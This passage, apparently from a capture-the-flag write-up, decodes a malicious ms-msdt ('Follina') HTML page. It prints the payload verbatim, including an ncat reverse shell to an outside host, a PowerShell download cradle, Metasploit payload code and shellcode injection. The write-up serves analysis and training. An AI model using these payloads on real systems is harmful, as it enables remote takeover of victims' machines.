%6F%67%55%48%56%75%5A%57%5A%64%49%67%6F%4B%4C%6C%4A%4C%54%6C%70%44%57%56%49%4B%51%30%59%67%55%44%70%63%50%6C%5A%68%61%57%4A%34%63%69%31%61%63%6D%64%75%5A%6D%4E%35%59%6E%5A%6E%51%32%35%73%65%57%4A%75%63%53%41%74%61%47%56%35%49%48%56%6E%5A%32%4E%6D%4F%69%38%76%63%6D%6C%32%65%53%35%79%61%32%35%36%59%33%6C%79%4C%6E%42%69%65%69%38%79%65%44%46%32%5A%6C%4A%78%5A%6E%6B%4B%55%57%4A%71%59%58%6C%69%62%6E%46%6D%49%47%35%68%63%53%42%79%61%33%4A%77%61%47%64%79%5A%69%42%75%49%46%70%79%5A%32%35%6D%59%33%6C%69%64%6D%63%67%59%32%35%73%65%57%4A%75%63%53%42%35%59%6E%42%75%5A%33%4A%78%49%47%35%6E%49%48%56%6E%5A%32%4E%6D%4F%69%38%76%63%6D%6C%32%65%53%35%79%61%32%35%36%59%33%6C%79%4C%6E%42%69%65%69%38%79%65%44%46%32%5A%6C%4A%78%5A%6E%6B%4B%43%67%6F%75%51%55%4A%48%55%6B%59%4B%54%47%4A%6F%49%48%42%75%59%53%42%6F%5A%6E%49%67%5A%33%56%79%49%43%49%74%61%58%4A%6C%62%32%4A%6D%63%69%49%67%59%6D%4E%6E%64%6D%4A%68%49%48%4E%69%5A%53%42%70%63%6D%56%76%59%6D%5A%79%49%47%4A%6F%5A%32%4E%6F%5A%79%34%4B%43%69%35%5A%56%6B%46%59%43%6C%52%32%5A%33%56%6F%62%7A%6F%67%64%57%64%6E%59%32%59%36%4C%79%39%30%64%6D%64%31%61%47%38%75%63%47%4A%36%4C%33%64%75%5A%58%4A%78%64%57%35%32%64%48%56%6E%4C%31%5A%68%61%57%4A%34%63%69%31%61%63%6D%64%75%5A%6D%4E%35%59%6E%5A%6E%51%32%35%73%65%57%4A%75%63%51%6F%4B%49%7A%34%6E%0A%0A%63%32%68%68%63%47%64%32%59%6D%45%67%56%6D%46%70%59%6E%68%79%4C%56%6C%69%64%48%5A%68%51%32%56%69%65%6D%4E%6E%65%77%6F%6B%63%47%56%79%63%53%41%39%49%43%52%56%59%6D%5A%6E%4C%6D%68%32%4C%6B%4E%6C%59%6E%70%6A%5A%31%4E%69%5A%56%42%6C%63%6E%46%79%59%57%64%32%62%6E%6B%6F%49%6B%70%32%59%58%46%69%61%6D%59%67%52%6E%4A%77%61%47%56%32%5A%32%77%69%4C%43%41%69%52%58%74%52%55%6B%5A%51%52%56%5A%44%52%31%5A%43%51%58%30%69%4C%43%41%69%4A%48%4A%68%61%54%70%6F%5A%6E%4A%6C%63%57%4A%36%62%6E%5A%68%58%43%52%79%59%57%6B%36%61%47%5A%79%5A%57%46%75%65%6E%49%69%4C%43%49%69%4B%51%6F%6B%61%47%5A%79%5A%57%46%75%65%6E%49%67%50%53%41%69%4A%48%4A%68%61%54%70%6F%5A%6E%4A%6C%59%57%35%36%63%69%49%4B%4A%48%46%69%65%6D%35%32%59%53%41%39%49%43%49%6B%63%6D%46%70%4F%6D%68%6D%63%6D%56%78%59%6E%70%75%64%6D%45%69%43%69%52%7A%61%48%6C%35%49%44%30%67%49%69%52%78%59%6E%70%75%64%6D%45%69%49%43%73%67%49%6C%77%69%49%43%73%67%49%69%52%6F%5A%6E%4A%6C%59%57%35%36%63%69%49%4B%4A%47%4E%75%5A%6D%5A%71%59%6D%56%78%49%44%30%67%4A%48%42%6C%63%6E%45%75%56%48%4A%6E%51%58%4A%6E%61%6D%4A%6C%65%46%42%6C%63%6E%46%79%59%57%64%32%62%6E%6B%6F%4B%53%35%6A%62%6D%5A%6D%61%6D%4A%6C%63%51%70%4F%63%58%45%74%52%32%78%6A%63%69%41%74%62%6D%5A%6D%63%6E%70%76%65%57%78%68%62%6E%70%79%49%45%5A%73%5A%6D%64%79%65%69%35%52%64%6D%56%79%63%47%64%69%5A%57%78%47%63%6D%56%70%64%6E%42%79%5A%69%35%4F%63%48%42%69%61%47%46%6E%57%6D%35%68%62%6E%52%79%65%6E%4A%68%5A%77%6F%6B%55%55%59%67%50%53%42%42%63%6D%6F%74%51%6D%39%33%63%6E%42%6E%49%45%5A%73%5A%6D%64%79%65%69%35%52%64%6D%56%79%63%47%64%69%5A%57%78%47%63%6D%56%70%64%6E%42%79%5A%69%35%4F%63%48%42%69%61%47%46%6E%57%6D%35%68%62%6E%52%79%65%6E%4A%68%5A%79%35%44%5A%58%5A%68%63%48%5A%6A%62%6E%6C%51%59%6D%46%6E%63%6D%74%6E%4B%46%74%47%62%47%5A%6E%63%6E%6F%75%55%58%5A%6C%63%6E%42%6E%59%6D%56%73%52%6E%4A%6C%61%58%5A%77%63%6D%59%75%54%6E%42%77%59%6D%68%68%5A%31%70%75%59%57%35%30%63%6E%70%79%59%57%63%75%55%47%4A%68%5A%33%4A%72%5A%30%64%73%59%33%4A%64%4F%6A%70%61%62%6E%42%31%64%6D%46%79%4B%51%70%71%64%58%5A%35%63%69%67%6B%55%55%59%75%53%57%35%35%64%6E%46%75%5A%33%4A%51%5A%58%4A%78%63%6D%46%6E%64%6D%35%35%5A%69%67%69%4A%48%4E%6F%65%58%6B%69%4C%43%49%6B%59%32%35%6D%5A%6D%70%69%5A%58%45%69%4B%53%41%74%59%58%49%67%4A%45%64%6C%61%48%49%70%65%77%6F%67%49%43%41%67%4A%48%42%6C%63%6E%45%67%50%53%41%6B%56%57%4A%6D%5A%79%35%6F%64%69%35%44%5A%57%4A%36%59%32%64%54%59%6D%56%51%5A%58%4A%78%63%6D%46%6E%64%6D%35%35%4B%43%4A%4B%64%6D%46%78%59%6D%70%6D%49%45%5A%79%63%47%68%6C%64%6D%64%73%49%69%77%67%49%6C%5A%68%61%57%35%35%64%6E%45%67%55%47%56%79%63%58%4A%68%5A%33%5A%75%65%57%59%73%49%45%4E%35%63%6D%35%6D%63%69%42%6E%5A%57%77%67%62%6E%52%75%64%6D%45%69%4C%43%41%69%4A%48%4A%68%61%54%70%6F%5A%6E%4A%6C%63%57%4A%36%62%6E%5A%68%58%43%52%79%59%57%6B%36%61%47%5A%79%5A%57%46%75%65%6E%49%69%4C%43%49%69%4B%51%6F%67%49%43%41%67%4A%47%68%6D%63%6D%56%68%62%6E%70%79%49%44%30%67%49%69%52%79%59%57%6B%36%61%47%5A%79%5A%57%46%75%65%6E%49%69%43%69%41%67%49%43%41%6B%63%57%4A%36%62%6E%5A%68%49%44%30%67%49%69%52%79%59%57%6B%36%61%47%5A%79%5A%58%46%69%65%6D%35%32%59%53%49%4B%49%43%41%67%49%43%52%7A%61%48%6C%35%49%44%30%67%49%69%52%78%59%6E%70%75%64%6D%45%69%49%43%73%67%49%6C%77%69%49%43%73%67%49%69%52%6F%5A%6E%4A%6C%59%57%35%36%63%69%49%4B%49%43%41%67%49%43%52%6A%62%6D%5A%6D%61%6D%4A%6C%63%53%41%39%49%43%52%77%5A%58%4A%78%4C%6C%52%79%5A%30%46%79%5A%32%70%69%5A%58%68%51%5A%58%4A%78%63%6D%46%6E%64%6D%35%35%4B%43%6B%75%59%32%35%6D%5A%6D%70%69%5A%58%45%4B%49%43%41%67%49%45%35%78%63%53%31%48%62%47%4E%79%49%43%31%75%5A%6D%5A%79%65%6D%39%35%62%47%46%75%65%6E%49%67%52%6D%78%6D%5A%33%4A%36%4C%6C%46%32%5A%58%4A%77%5A%32%4A%6C%62%45%5A%79%5A%57%6C%32%63%48%4A%6D%4C%6B%35%77%63%47%4A%6F%59%57%64%61%62%6D%46%75%64%48%4A%36%63%6D%46%6E%43%69%41%67%49%43%41%6B%55%55%59%67%50%53%42%42%63%6D%6F%74%51%6D%39%33%63%6E%42%6E%49%45%5A%73%5A%6D%64%79%65%69%35%52%64%6D%56%79%63%47%64%69%5A%57%78%47%63%6D%56%70%64%6E%42%79%5A%69%35%4F%63%48%42%69%61%47%46%6E%57%6D%35%68%62%6E%52%79%65%6E%4A%68%5A%79%35%44%5A%58%5A%68%63%48%5A%6A%62%6E%6C%51%59%6D%46%6E%63%6D%74%6E%4B%46%74%47%62%47%5A%6E%63%6E%6F%75%55%58%5A%6C%63%6E%42%6E%59%6D%56%73%52%6E%4A%6C%61%58%5A%77%63%6D%59%75%54%6E%42%77%59%6D%68%68%5A%31%70%75%59%57%35%30%63%6E%70%79%59%57%63%75%55%47%4A%68%5A%33%4A%72%5A%30%64%73%59%33%4A%64%4F%6A%70%61%62%6E%42%31%64%6D%46%79%4B%51%6F%67%49%43%41%67%4A%46%46%47%4C%6B%6C%75%65%58%5A%78%62%6D%64%79%55%47%56%79%63%58%4A%68%5A%33%5A%75%65%57%59%6F%49%69%52%7A%61%48%6C%35%49%69%77%67%49%69%52%6A%62%6D%5A%6D%61%6D%4A%6C%63%53%49%70%49%48%77%67%59%6D%68%6E%4C%57%46%6F%65%58%6B%4B%49%43%41%67%49%48%30%4B%49%43%52%69%61%47%64%6A%61%47%63%67%50%53%41%6B%59%58%4A%71%63%47%56%79%63%53%41%39%49%43%52%77%5A%58%4A%78%4C%6C%52%79%5A%30%46%79%5A%32%70%69%5A%58%68%51%5A%58%4A%78%63%6D%46%6E%64%6D%35%35%4B%43%6B%67%66%43%42%6D%63%6E%6C%79%63%47%63%74%59%6D%39%33%63%6E%42%6E%49%45%68%6D%63%6D%56%42%62%6E%70%79%4C%43%42%52%59%6E%70%75%64%6D%45%73%49%45%4E%75%5A%6D%5A%71%59%6D%56%78%43%69%41%6B%59%6D%68%6E%59%32%68%6E%43%69%42%46%65%30%5A%48%54%6B%56%48%58%30%4E%46%51%6C%42%53%52%6B%5A%39%43%6E%30%67%0A%3C%2F%70%3E%0A%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%6C%6F%63%61%74%69%6F%6E%2E%68%72%65%66%20%3D%20%22%6D%73%2D%6D%73%64%74%3A%2F%69%64%20%50%43%57%44%69%61%67%6E%6F%73%74%69%63%20%2F%73%6B%69%70%20%66%6F%72%63%65%20%2F%70%61%72%61%6D%20%5C%22%49%54%5F%52%65%62%72%6F%77%73%65%46%6F%72%46%69%6C%65%3D%3F%20%49%54%5F%4C%61%75%6E%63%68%4D%65%74%68%6F%64%3D%43%6F%6E%74%65%78%74%4D%65%6E%75%20%49%54%5F%42%72%6F%77%73%65%46%6F%72%46%69%6C%65%3D%24%28%49%6E%76%6F%6B%65%2D%45%78%70%72%65%73%73%69%6F%6E%28%24%28%49%6E%76%6F%6B%65%2D%45%78%70%72%65%73%73%69%6F%6E%28%27%5B%53%79%73%74%65%6D%2E%54%65%78%74%2E%45%6E%63%6F%64%69%6E%67%5D%27%2B%5B%63%68%61%72%5D%35%38%2B%5B%63%68%61%72%5D%35%38%2B%27%55%6E%69%63%6F%64%65%2E%47%65%74%53%74%72%69%6E%67%28%5B%53%79%73%74%65%6D%2E%43%6F%6E%76%65%72%74%5D%27%2B%5B%63%68%61%72%5D%35%38%2B%5B%63%68%61%72%5D%35%38%2B%27%46%72%6F%6D%42%61%73%65%36%34%53%74%72%69%6E%67%28%27%2B%5B%63%68%61%72%5D%33%34%2B%27%59%77%41%36%41%46%77%41%58%41%42%33%41%47%6B%41%62%67%42%6B%41%47%38%41%64%77%42%7A%41%46%77%41%58%41%42%7A%41%48%6B%41%63%77%42%30%41%47%55%41%62%51%41%7A%41%44%49%41%58%41%42%63%41%47%4D%41%62%51%42%6B%41%43%34%41%5A%51%42%34%41%47%55%41%49%41%41%76%41%47%4D%41%49%41%42%75%41%47%4D%41%59%51%42%30%41%43%41%41%64%77%42%33%41%48%63%41%4C%67%42%33%41%47%6B%41%62%67%42%6B%41%47%38%41%64%77%42%7A%41%47%77%41%61%51%42%32%41%47%55%41%64%51%42%77%41%47%51%41%59%51%42%30%41%47%55%41%63%67%41%75%41%47%4D%41%62%77%42%74%41%43%41%41%4E%51%41%30%41%44%63%41%4E%67%41%67%41%43%30%41%5A%51%41%67%41%47%4D%41%62%51%42%6B%41%43%34%41%5A%51%42%34%41%47%55%41%4F%77%41%67%41%43%51%41%63%41%42%30%41%44%45%41%50%51%42%63%41%43%49%41%53%41%42%55%41%45%49%41%65%77%42%61%41%47%55%41%63%67%41%77%41%46%38%41%52%41%42%68%41%48%6B%41%57%67%42%66%41%44%51%41%55%67%42%6C%41%46%38%41%51%77%41%77%41%45%38%41%62%41%42%66%41%45%49%41%64%51%42%55%41%46%38%41%58%41%41%69%41%41%3D%3D%27%2B%5B%63%68%61%72%5D%33%34%2B%27%29%29%27%29%29%29%29%69%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2F%53%79%73%74%65%6D%33%32%2F%6D%70%73%69%67%73%74%75%62%2E%65%78%65%5C%22%22%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E\u0026#39;)) //--\u0026gt; \u0026lt;/script\u0026gt; Using this url decoder, https://meyerweb.com/eric/tools/dencoder/, we can see what the page would look like.\nHere is the full transcript, for references, but I started going from the top, decoding the different \u0026lt;p\u0026gt;. As you can see from the previous screenshot, I could only see the first few \u0026lt;p\u0026gt; and not the call to ms-msdt.\n\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt; Good thing we disabled macros \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; ICAgIEpldmdyLUlyZW9iZnIgIlsqXSBQZXJuZ3ZhdCBRYmpheWJucSBQZW5xeXIgZnBldmNnIGhmdmF0ICRoZXkiCiAgICAkUWJqYXlibnFQZW5xeXIgPSdbRmxmZ3J6LkFyZy5GcmVpdnByQ2J2YWdabmFudHJlXTo6RnJlaXJlUHJlZ3ZzdnBuZ3JJbnl2cW5ndmJhUG55eW9ucHggPSB7JGdlaHJ9OyRweXZyYWcgPSBBcmotQm93cnBnIEFyZy5Kcm9QeXZyYWc7JHB5dnJhZy5DZWJrbD1bQXJnLkpyb0VyZGhyZmddOjpUcmdGbGZncnpKcm9DZWJrbCgpOyRweXZyYWcuQ2Via2wuUGVycXJhZ3ZueWY9W0FyZy5QZXJxcmFndm55UG5wdXJdOjpRcnNuaHlnUGVycXJhZ3ZueWY7VmFpYnhyLVJrY2VyZmZ2YmEgJHB5dnJhZy5xYmpheWJucWZnZXZhdCgnJycrJGhleSsnJycpOyc0 ICAgIHsKICAgICAgICBKZXZnci1JcmVvYmZyICJbKl0gWWJieGYgeXZ4ciBqcidlciAzMm92ZywgaGZ2YXQgZmxmamJqNjQgY2JqcmVmdXJ5eS5ya3IiCiAgICAgICAgJENianJlZnVyeXlSa3I9JHJhaTpqdmFxdmUrJ1xmbGZqYmo2NFxKdmFxYmpmQ2JqcmVGdXJ5eVxpMS4wXGNianJlZnVyeXkucmtyJwogICAgfTsKICAgIAAg \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; c2hhcGd2YmEgVmFpYnhyLVpyZ25mY3lidmdDbmx5Ym5xIAp7CjwjCi5GTEFCQ0ZWRgpYdnB4IGJzcyBuIFpyZ25mY3lidmcgQ25seWJucSBoZnZhdCBndXIgcmtjeWJ2Zy96aHlndi9mcGV2Y2cvanJvX3FyeXZpcmVsIHpicWh5cgpOaGd1YmU6IFduZXJxIFVudnR1ZyAoQHduZXJxdW52dHVnKQpZdnByYWZyOiBaVkcKRXJkaHZlcnEgUXJjcmFxcmFwdnJmOiBBYmFyCkJjZ3ZiYW55IFFyY3JhcXJhcHZyZjogQWJhcgogCi5RUkZQRVZDR1ZCQQpGY25qYWYgbiBhcmosIHV2cXFyYSBDYmpyZUZ1cnl5IGp2YXFiaiBndW5nIHFiamF5Ym5xZiBuYXEgcmtycGhncmYgbiBacmduZmN5YnZnIGNubHlibnEgc2VieiBuIGZjcnB2c3ZycSBIRVkuCgpHdXZmIGVyeXZyZiBiYSBndXIgcmtjeWJ2Zy96aHlndi9mcGV2Y2dmL2pyb19xcnl2aXJlbCB6cmduZmN5YnZnIHpicWh5ci4gR3VyIGpyb19xcnl2aXJlbCB6YnFoeXIgdHJhcmVuZ3JmIG4gZnBldmNnIHNiZQpuIHR2aXJhIGNubHlibnEgbmFxIGd1cmEgc3ZlcmYgaGMgbiBqcm9mcmVpcmUgZ2IgdWJmZyBmbnZxIGZwZXZjZy4gVnMgZ3VyIGNubHlibnEgdmYgbiBlcmlyZWZyIGZ1cnl5LCB2ZyBqdnl5IG55ZmIgdW5hcXlyCmZnbmVndmF0IGhjIGd1ciB5dmZncmFyZSBzYmUgZ3VuZyBjbmx5Ym5xLiAKCk5hIHJrbnpjeXIgZXAgc3Z5ciB2ZiBvcnliaiAoYmUgbGJoIHBuYSB3aGZnIGdsY3IgZ3VyIHBienpuYXFmIHpuYWhueXlsKS4gVmcgcWJyZiBndXIgc2J5eWJqdmF0OgoKKiBGcmdmIGd1ciBxYmpheWJucSBwZW5xeXIgZ2IgY2JlZyA4NDQzIChGRUlDQkVHKSBiYSBueXkgVkNmIChGRUlVQkZHKQoqIEZyZ2YgZ3VyIGZwZXZjZyBnbmV0cmcgZ2IgQ2JqcmVGdXJ5eSAoZnJnIGduZXRyZyAyKQoqIEZyZ2YgZ3VyIGNubHlibnEgb3J2YXQgZnJlaXJxIGdiIGp2YXFiamYvenJncmVjZXJncmUvZXJpcmVmcl91Z2djZgoqIEZyZ2YgZ3VyIGNubHlibnEgZ2IgeXZmZ3JhIGJhIGNiZWcgNDQzIChZQ0JFRykgYmEgbnl5IFZDZiAoWVVCRkcp ICAgIHZzICgkRnVyeXlwYnFyNjQuWXJhdGd1IC1yZCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBHdWViaiAnQWIgZnVyeXlwYnFyIGpuZiBjeW5wcnEgdmEgZ3VyICRGdXJ5eXBicXI2NCBpbmV2bm95ciEnCiAgICAgICAgICAgICAgICBlcmdoZWEKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJEZ1cnl5cGJxciA9ICRGdXJ5eXBicXI2NAogICAgICAgICAgICBKZXZnci1JcmVvYmZyICdIZnZhdCA2NC1vdmcgZnVyeXlwYnFyLicKICAgICAgICB9CiAgICAKICAgICAgICAjIE55eWJwbmdyIEVKSyB6cnpiZWwgc2JlIGd1ciBmdXJ5eXBicXIKICAgICAgICAkT25mck5xcWVyZmYgPSAkSXZlZ2hueU55eWJwLlZhaWJ4cihbVmFnQ2dlXTo6TXJlYiwgJEZ1cnl5cGJxci5ZcmF0Z3UgKyAxLCAwazMwMDAsIDBrNDApICMgKEVyZnJlaXJ8UGJ6enZnLCBFSkspCiAgICAgICAgdnMgKCEkT25mck5xcWVyZmYpCiAgICAgICAgewogICAgICAgICAgICBHdWViaiAiSGFub3lyIGdiIG55eWJwbmdyIGZ1cnl5cGJxciB6cnpiZWwgdmEgQ1ZROiAkQ2VicHJmZlZRIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBKZXZnci1JcmVvYmZyICJGdXJ5eXBicXIgenJ6YmVsIGVyZnJlaXJxIG5nIDBrJCgkT25mck5xcWVyZmYuR2JGZ2V2YXQoIkskKFtWYWdDZ2VdOjpGdm1yKjIpIikpIgoKICAgICAgICAjIFBiY2wgZnVyeXlwYnFyIGdiIEVKSyBvaHNzcmUKICAgICAgICBbRmxmZ3J6LkVoYWd2enIuVmFncmViY0ZyZWl2cHJmLlpuZWZ1bnldOjpQYmNsKCRGdXJ5eXBicXIsIDAsICRPbmZyTnFxZXJmZiwgJEZ1cnl5cGJxci5ZcmF0Z3UpCiAgICAgICAgCiAgICAgICAgIyBUcmcgbnFxZXJmZiBicyBSa3ZnR3Vlcm5xIHNoYXBndmJhCiAgICAgICAgJFJrdmdHdWVybnFOcXFlID0gVHJnLUNlYnBOcXFlcmZmIHhyZWFyeTMyLnF5eSBSa3ZnR3Vlcm5xCiAgICAgICAgCiAgICAgICAgdnMgKCRDYmpyZUZ1cnl5MzJvdmcpCiAgICAgICAgewogICAgICAgICAgICAkUG55eUZnaG8gPSBSenZnLVBueXlHdWVybnFGZ2hvICRPbmZyTnFxZXJmZiAkUmt2Z0d1ZXJucU5xcWUgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIEpldmdyLUlyZW9iZnIgJ1J6dmdndmF0IDMyLW92ZyBuZmZyem95bCBwbnl5IGZnaG8uJwogICAgICAgIH0KICAgICAgICByeWZyCiAgICAgICAgewogICAgICAgICAgICAkUG55eUZnaG8gPSBSenZnLVBueXlHdWVybnFGZ2hvICRPbmZyTnFxZXJmZiAkUmt2Z0d1ZXJucU5xcWUgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIEpldmdyLUlyZW9iZnIgJ1J6dmdndmF0IDY0LW92ZyBuZmZyem95bCBwbnl5IGZnaG8uJwogICAgICAgIH0KCiAgICAgICAgIyBOeXlicG5nciBFSksgenJ6YmVsIHNiZSBndXIgZ3Vlcm5xIHBueXkgZmdobwogICAgICAgICRQbnl5Rmdob05xcWVyZmYgPSAkSXZlZ2hueU55eWJwLlZhaWJ4cihbVmFnQ2dlXTo6TXJlYiwgJFBueXlGZ2hvLllyYXRndSArIDEsIDBrMzAwMCwgMGs0MCkgIyAoRXJmcmVpcnxQYnp6dmcsIEVKSykKICAgICAgICB2cyAoISRQbnl5Rmdob05xcWVyZmYpCiAgICAgICAgewogICAgICAgICAgICBHdWViaiAiSGFub3lyIGdiIG55eWJwbmdyIGd1ZXJucSBwbnl5IGZnaG8uIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBKZXZnci1JcmVvYmZyICJHdWVybnEgcG55eSBmZ2hvIHpyemJlbCBlcmZyZWlycSBuZyAwayQoJFBueXlGZ2hvTnFxZXJmZi5HYkZnZXZhdCgiSyQoW1ZhZ0NnZV06OkZ2bXIqMikiKSkiCgogICAgICAgICMgUGJjbCBwbnl5IGZnaG8gZ2IgRUpLIG9oc3NyZQogICAgICAgIFtGbGZncnouRWhhZ3Z6ci5WYWdyZWJjRnJlaXZwcmYuWm5lZnVueV06OlBiY2woJFBueXlGZ2hvLCAwLCAkUG55eUZnaG9OcXFlcmZmLCAkUG55eUZnaG8uWXJhdGd1KQoKICAgICAgICAjIFluaGFwdSBmdXJ5eXBicXIgdmEgdmcnZiBiamEgZ3Vlcm5xCiAgICAgICAgJEd1ZXJucVVuYXF5ciA9ICRQZXJuZ3JHdWVybnEuVmFpYnhyKFtWYWdDZ2VdOjpNcmViLCAwLCAkUG55eUZnaG9OcXFlcmZmLCAkT25mck5xcWVyZmYsIDAsIFtWYWdDZ2VdOjpNcmViKQogICAgICAgIHZzICghJEd1ZXJucVVuYXF5cikKICAgICAgICB7CiAgICAgICAgICAgIEd1ZWJqICJIYW5veXIgZ2IgeW5oYXB1IGd1ZXJucS4iCiAgICAgICAgfSAg \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; Ci5DTkVOWlJHUkUgaGV5Ckd1dmYgdmYgZ3VyIEhFWSBzYmUgZ3VyIHFiamF5Ym5xIHBlbnF5ciwgb2wgcXJzbmh5ZyB2ZyBqdnl5IG9yIGZienJndXZhdCAKeXZ4ciAidWdnY2Y6Ly9yaXZ5LnJrbnpjeXIucGJ6L1tFbmFxYnogUHVuZWZdIgoKLlJLTlpDWVIKQ0YgUDpcPlZhaWJ4ci1acmduZmN5YnZnQ25seWJucSAtaGV5IHVnZ2NmOi8vcml2eS5ya256Y3lyLnBiei8yeDF2ZlJxZnkKUWJqYXlibnFmIG5hcSBya3JwaGdyZiBuIFpyZ25mY3lidmcgY25seWJucSB5YnBuZ3JxIG5nIHVnZ2NmOi8vcml2eS5ya256Y3lyLnBiei8yeDF2ZlJxZnkKCgouQUJHUkYKTGJoIHBuYSBoZnIgZ3VyICItaXJlb2JmciIgYmNndmJhIHNiZSBpcmVvYmZyIGJoZ2NoZy4KCi5ZVkFYClR2Z3VobzogdWdnY2Y6Ly90dmd1aG8ucGJ6L3duZXJxdW52dHVnL1ZhaWJ4ci1acmduZmN5YnZnQ25seWJucQoKIz4n c2hhcGd2YmEgVmFpYnhyLVlidHZhQ2ViemNnewokcGVycSA9ICRVYmZnLmh2LkNlYnpjZ1NiZVBlcnFyYWd2bnkoIkp2YXFiamYgRnJwaGV2Z2wiLCAiRXtRUkZQRVZDR1ZCQX0iLCAiJHJhaTpoZnJlcWJ6bnZhXCRyYWk6aGZyZWFuenIiLCIiKQokaGZyZWFuenIgPSAiJHJhaTpoZnJlYW56ciIKJHFiem52YSA9ICIkcmFpOmhmcmVxYnpudmEiCiRzaHl5ID0gIiRxYnpudmEiICsgIlwiICsgIiRoZnJlYW56ciIKJGNuZmZqYmVxID0gJHBlcnEuVHJnQXJnamJleFBlcnFyYWd2bnkoKS5jbmZmamJlcQpOcXEtR2xjciAtbmZmcnpveWxhbnpyIEZsZmdyei5RdmVycGdiZWxGcmVpdnByZi5OcHBiaGFnWm5hbnRyenJhZwokUUYgPSBBcmotQm93cnBnIEZsZmdyei5RdmVycGdiZWxGcmVpdnByZi5OcHBiaGFnWm5hbnRyenJhZy5DZXZhcHZjbnlQYmFncmtnKFtGbGZncnouUXZlcnBnYmVsRnJlaXZwcmYuTnBwYmhhZ1puYW50cnpyYWcuUGJhZ3JrZ0dsY3JdOjpabnB1dmFyKQpqdXZ5cigkUUYuSW55dnFuZ3JQZXJxcmFndm55ZigiJHNoeXkiLCIkY25mZmpiZXEiKSAtYXIgJEdlaHIpewogICAgJHBlcnEgPSAkVWJmZy5odi5DZWJ6Y2dTYmVQZXJxcmFndm55KCJKdmFxYmpmIEZycGhldmdsIiwgIlZhaW55dnEgUGVycXJhZ3ZueWYsIEN5cm5mciBnZWwgbnRudmEiLCAiJHJhaTpoZnJlcWJ6bnZhXCRyYWk6aGZyZWFuenIiLCIiKQogICAgJGhmcmVhbnpyID0gIiRyYWk6aGZyZWFuenIiCiAgICAkcWJ6bnZhID0gIiRyYWk6aGZyZXFiem52YSIKICAgICRzaHl5ID0gIiRxYnpudmEiICsgIlwiICsgIiRoZnJlYW56ciIKICAgICRjbmZmamJlcSA9ICRwZXJxLlRyZ0FyZ2piZXhQZXJxcmFndm55KCkuY25mZmpiZXEKICAgIE5xcS1HbGNyIC1uZmZyem95bGFuenIgRmxmZ3J6LlF2ZXJwZ2JlbEZyZWl2cHJmLk5wcGJoYWdabmFudHJ6cmFnCiAgICAkUUYgPSBBcmotQm93cnBnIEZsZmdyei5RdmVycGdiZWxGcmVpdnByZi5OcHBiaGFnWm5hbnRyenJhZy5DZXZhcHZjbnlQYmFncmtnKFtGbGZncnouUXZlcnBnYmVsRnJlaXZwcmYuTnBwYmhhZ1puYW50cnpyYWcuUGJhZ3JrZ0dsY3JdOjpabnB1dmFyKQogICAgJFFGLklueXZxbmdyUGVycXJhZ3ZueWYoIiRzaHl5IiwgIiRjbmZmamJlcSIpIHwgYmhnLWFoeXkKICAgIH0KICRiaGdjaGcgPSAkYXJqcGVycSA9ICRwZXJxLlRyZ0FyZ2piZXhQZXJxcmFndm55KCkgfCBmcnlycGctYm93cnBnIEhmcmVBbnpyLCBRYnpudmEsIENuZmZqYmVxCiAkYmhnY2hnCiBFe0ZHTkVHX0NFQlBSRkZ9Cn0g \u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; location.href = \u0026#34;ms-msdt:/id PCWDiagnostic /skip force /param \\\u0026#34;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(\u0026#39;[System.Text.Encoding]\u0026#39;+[char]58+[char]58+\u0026#39;Unicode.GetString([System.Convert]\u0026#39;+[char]58+[char]58+\u0026#39;FromBase64String(\u0026#39;+[char]34+\u0026#39;YwA6AFwAXAB3AGkAbgBkAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAIAAvAGMAIABuAGMAYQB0ACAAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtACAANQA0ADcANgAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAOwAgACQAcAB0ADEAPQBcACIASABUAEIAewBaAGUAcgAwAF8ARABhAHkAWgBfADQAUgBlAF8AQwAwAE8AbABfAEIAdQBUAF8AXAAiAA==\u0026#39;+[char]34+\u0026#39;))\u0026#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\u0026#34;\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; After going through echo \u0026quot;\u0026lt;data\u0026gt;\u0026quot; | base64 -d and sending the result to https://rot13.com/ multiple time, I decided to use CyberChef to do both steps at once.\nWrite-Verbose \u0026#34;[*] Creating Download Cradle script using $url\u0026#34; $DownloadCradle =\u0026#39;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring(\u0026#39;\u0026#39;\u0026#39;+$url+\u0026#39;\u0026#39;\u0026#39;);\u0026#39;4 { Write-Verbose \u0026#34;[*] Looks like we\u0026#39;re 32bit, using syswow64 powershell.exe\u0026#34; $PowershellExe=$env:windir+\u0026#39;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; }; . function Invoke-MetasploitPayload { \u0026lt;# .SYNOPSIS Kick off a 